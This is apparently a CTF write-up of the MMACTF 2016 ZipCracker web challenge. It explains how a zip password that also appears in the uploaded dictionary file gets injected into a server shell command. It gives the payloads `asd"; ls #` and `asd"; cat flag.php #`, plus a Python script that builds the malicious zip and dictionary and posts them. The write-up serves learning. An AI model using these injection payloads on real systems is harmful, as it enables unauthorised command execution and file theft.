---
author: AnirudhAnand
layout: post
title: Command Injection via Bruteforce ZipCracker - MMACTF 2016 Web 200 writeup
categories:
- ctf
summary: Command injection via the dictionary file used for bruteforce. (MMACTF 2016 web 100 writeup)
description: Command injection via the dictionary file used for bruteforce. (MMACTF 2016 web 100 writeup)
---

## Introduction

Zip cracker was truly an interesting challenge. The moment I saw the application, I was sure that the vulnearbility will either be Symlink attacks (if the zip is returning the extracted content) or Command Injection (If the zip is taking userinput inside commnds). Since the application just tells us that the password is correct or wrong and never shows the extracted files back to the user, Symlink attacks might not work. So next best case is command injection !

## Challenge

So we could create a zip with a password and we can upload it to the ZipCracker along with a dict.txt (where the possible passwords are listed line by line). We have the option to chooze `unzip` or not, but both times it returns seperate outputs.

Challenge URL: [http://zipcracker.chal.ctf.westerns.tokyo](http://zipcracker.chal.ctf.westerns.tokyo/)

So here is what I guessed from the challenge:

1) When trying to bruteforce without the `unzip` option, it returns (if correct password is found) `Possible password: paSSw0rd ()`.

2) When trying to bruteforce with the `unzip` option, it returns (if correct password is found) `Password Found ! pw == p@ssw0rd`.

Now if we compare the 2 cases, we can see that in the 2nd case, actual extraction of the zip happens while it's not the case with first. So the chances of command injections are high in the 2nd case.

Next question is how do we inject ? The possible place is on zip password. What if we encrypts zip with passwords containing special characters like `;`, `&` which are also valid command seperators ?

Eventhough my approach here was right, it took me a long time to figure out something so silly ! The mistakes I did was:

1) The filename was included inside double quotes in the server but I was trying without quotes so essentially what ever I try, server takes it as a string as I am in the string context.

2) Once our injection is done, we should comment out the rest of the commands that gets added by the server or else our injection might not work properly. I actually forgot to give a `#` at the end of the injection string :O (How could I ?)

## Solution:

After finding my mistakes I clearly understood what all I was missing and the final payload becomes `asd"; ls #` and this will output the files in which there was an interesting file called `flag.` So the final payload becomes `asd"; cat flag.php #`

The problem can automatically be cracked using the python script below (my team has writen a script so that we don't have to manually upload each time we channge password):

{%highlight python lineos %}

import requests
import json
import subprocess
import os


try:
    os.remove('zipped.zip')
except OSError:
    pass


password = """asd"; cat flag.php #""" # password of zip file
zipfilename = 'zipfile.zip' #the zip name that gets posted
dictfilename = 'dictionary.txt' #the dict name that gets posted
dictfilecontents = """password1\npassword12\npassword123\nasd"; cat flag.php #\n1\n""" #dictionary file contents
unzip = True

#zips the random.txt file with password into zipped.zip
subprocess.call(['zip', '--password', password, 'zipped.zip', 'random.txt'])



dictfile = open('dict.txt', 'w')
dictfile.write(dictfilecontents)
dictfile.close()

url = "http://zipcracker.chal.ctf.westerns.tokyo/"
multiple_files = [
        ('zip', (zipfilename, open('zipped.zip', 'rb'), 'application/x-zip-compressed')),
        ('dict', (dictfilename, open('dict.txt', 'rb'), 'text/plain'))
]

data = {}
if unzip:
    data['unzip'] = 'on'
r = requests.post(url, files=multiple_files, data=data)
print r.text

{%endhighlight%}

Just run the script `python zipcracker.py` and it will output the results on the screen !
